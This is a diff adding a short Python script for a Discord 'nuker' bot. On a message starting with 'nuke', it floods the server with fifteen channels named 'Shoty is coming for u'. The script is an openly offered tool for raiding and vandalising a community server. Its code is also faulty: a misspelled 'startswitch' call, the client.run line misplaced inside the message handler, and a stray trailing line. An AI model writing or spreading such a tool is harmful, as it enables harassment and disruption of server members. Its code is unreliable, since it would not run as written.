@@ -1,0 +1,33 @@
+import os
+import discord
+
+client = discord.Client()
+
+@client.event
+async def on_ready():
+  print('Discord Nuker is Ready')
+
+@client.event
+async def on_message(message):
+  if (message.content.startswitch('nuke')):
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+    await message.guild.create_text_channel('Shoty is coming for u')
+
+  client.run(os.getenv('TOKEN'))
+
+
+
+environment bot token
